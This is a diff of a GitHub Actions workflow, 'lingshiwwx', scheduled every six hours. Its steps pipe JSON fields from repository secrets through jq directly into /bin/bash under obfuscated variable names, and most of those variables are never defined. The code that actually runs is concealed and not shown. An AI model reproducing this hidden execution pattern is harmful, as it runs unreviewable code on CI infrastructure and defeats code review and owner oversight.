@@ -1,9 +1,10 @@
 name: lingshiwwx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 1/6 * * *'
-jobs:  # 29578
+    - cron: '49 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,21 +12,11 @@ jobs:  # 29578
       - uses: actions/checkout@v4
       - name: lingshiwwx
         env:
-          kmdf50: ${{ secrets.kmdf50 }}
+          vlat516: ${{ secrets.vlat516 }}
         run: |
-          echo $kmdf50 | jq -r .tty6 | /bin/bash
-          echo $p05376 | jq -r .au5 | /bin/bash
-          echo $gnao740 | jq -r .qdfbk800 | /bin/bash
-          echo $nfpr536 | jq -r .wdf649 | /bin/bash
-          echo $o0 | jq -r .txx67658 | /bin/bash
-          echo $l1645 | jq -r .e995 | /bin/bash
-          echo $nvu032 | jq -r .uz1240 | /bin/bash
-          echo $kc9705 | jq -r .s15694 | /bin/bash
-          echo $tb3664 | jq -r .ajxzo9369 | /bin/bash
-          echo $qr7 | jq -r .esf80 | /bin/bash
-          echo $x48571 | jq -r .tjw615 | /bin/bash
-          echo $js137 | jq -r .ez00 | /bin/bash
-          echo $tqhnt9104 | jq -r .w09847 | /bin/bash
-          echo $sjov3 | jq -r .puooe0659 | /bin/bash
-          echo $hye312 | jq -r .xidqp08021 | /bin/bash
+          echo $vlat516 | jq -r .al6848 | /bin/bash
+          echo $ktjfj61567 | jq -r .x5 | /bin/bash
+          echo $gcht002 | jq -r .kuaos4102 | /bin/bash
+          echo $klxs6115 | jq -r .h654 | /bin/bash
+          echo $ury09 | jq -r .rdnp9 | /bin/bash
 
